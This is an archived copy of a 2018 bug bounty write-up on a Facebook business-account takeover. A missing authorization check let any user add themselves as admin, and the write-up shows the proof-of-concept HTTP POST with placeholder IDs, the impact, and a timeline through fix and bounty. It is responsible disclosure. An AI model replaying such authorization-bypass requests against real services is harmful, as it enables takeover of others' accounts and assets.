---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-09_facebook-business-takeover.md
original_filename: 2018-10-09_facebook-business-takeover.md
title: Facebook Business Takeover
category: documents
detected_topics:
- access-control
- command-injection
- otp
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- otp
- business-logic
language: en
raw_sha256: 173c3b8cfa0b0e10e58d6718634b55718395f325b024612675a76cb703537084
text_sha256: 67a2c7a6d188761fd2487338bbe12136c8ae301406ecad0e82c15d25bdfcc6f6
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Facebook Business Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-09_facebook-business-takeover.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, business-logic
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `173c3b8cfa0b0e10e58d6718634b55718395f325b024612675a76cb703537084`
- Text SHA256: `67a2c7a6d188761fd2487338bbe12136c8ae301406ecad0e82c15d25bdfcc6f6`


## Content

---
title: "Facebook Business Takeover"
page_title: "Facebook Business Takeover - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/facebook-business-takeover/"
final_url: "https://philippeharewood.com/facebook-business-takeover/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization", "Logic flaw"]
bounty: "27,500"
publication_date: "2018-10-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5652
---

Posted on [October 9, 2018February 24, 2025](https://philippeharewood.com/facebook-business-takeover/)

# Facebook Business Takeover

There is a call to import admins to a business account. The call at the time didn’t seem to have any permissions set to it. This meant it was possible to add oneself as an admin to any business.

**Proof of Concept**
  
  
  HTTP POST
  /business/aymc_assets/admins/import/
  Host: facebook.com
  business_id=TARGET_BUSINESS_ID
  admin_id=MALICIOUS_USER_ID
  session_id=SESSION_ID

This will add the user to the business as an administrator.

**Impact**

This could have let an attacker without an existing role, take over any business account and gain access to various business assets (Facebook pages, Ad accounts, applications, Instagram accounts) connected to the business.

**Timeline**

  * Oct 9, 2018 – Report Sent
  * Oct 9, 2018 – Further investigation by Facebook
  * Oct 10, 2018 – Endpoint removed
  * Oct 15, 2018 – Confirmation of audit by Facebook
  * Oct 15, 2018 – Fixed by Facebook
  * Oct 17, 2018 – $27,500 bounty awarded by Facebook
